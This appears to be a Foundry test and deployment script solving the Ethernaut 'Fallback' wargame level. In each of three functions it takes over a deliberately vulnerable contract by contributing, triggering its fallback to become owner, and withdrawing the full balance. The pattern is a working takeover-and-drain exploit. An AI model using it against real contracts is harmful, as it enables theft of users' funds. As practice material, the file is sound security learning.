// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Test.sol";
import "./Instance.sol";

contract Clear is Test {
    Fallback private _instance;
    address payable private _player;

    function testLocal() external {
        _instance = new Fallback();
        _player = payable(vm.envAddress("PLAYER"));
        vm.deal(_player, 10 ether);

        vm.startPrank(_player);
        // 1
        _instance.contribute{value: 10}();
        // 2
        (bool success, ) = payable(address(_instance)).call{value: 10}("");
        assertTrue(success);
        // 3
        _instance.withdraw();
        vm.stopPrank();

        assertEq(Fallback(_instance).owner(), _player);
        assertEq(address(_instance).balance, 0);
    }

    function testFork() external {
        vm.createSelectFork(vm.rpcUrl("rinkeby"));
        _instance = Fallback(payable(vm.envAddress("FALLBACK")));
        _player = payable(vm.envAddress("PLAYER"));

        vm.startPrank(_player);
        // 1
        _instance.contribute{value: 10}();
        // 2
        (bool success, ) = payable(address(_instance)).call{value: 10}("");
        assertTrue(success);
        // 3
        _instance.withdraw();
        vm.stopPrank();

        assertEq(_instance.owner(), _player);
        assertEq(address(_instance).balance, 0);
    }

    function run() external {
        vm.startBroadcast();
        _instance = Fallback(payable(vm.envAddress("FALLBACK")));
        _player = payable(vm.envAddress("PLAYER"));

        // 1
        _instance.contribute{value: 10}();
        // 2
        (bool success, ) = payable(address(_instance)).call{value: 10}("");
        assertTrue(success);
        // 3
        _instance.withdraw();
        vm.stopBroadcast();
        assertEq(_instance.owner(), _player);
        assertEq(address(_instance).balance, 0);
    }
}
